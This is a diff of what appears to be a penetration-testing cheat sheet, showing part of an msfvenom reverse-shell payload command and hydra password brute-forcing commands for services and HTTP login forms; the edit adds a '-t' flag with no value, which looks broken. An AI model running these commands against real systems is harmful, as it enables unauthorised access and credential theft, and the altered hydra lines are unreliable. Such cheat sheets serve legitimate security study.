@@ -45,12 +45,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f
 
 ### hydra (brute forcing)
 ```
-hydra -l <USERNAME> -P <PASSWORD_LIST> <SERVICE>://<IP_ADDRESS>
+hydra -t -V -l <USERNAME> -P <PASSWORD_LIST> <SERVICE>://<IP_ADDRESS> 
 ```
 
 ### hydra (http-post-form)
 ```
-hydra -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
+hydra -t -V -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
 ```
 
 ### Immunity Debugger (Finding bad characters)
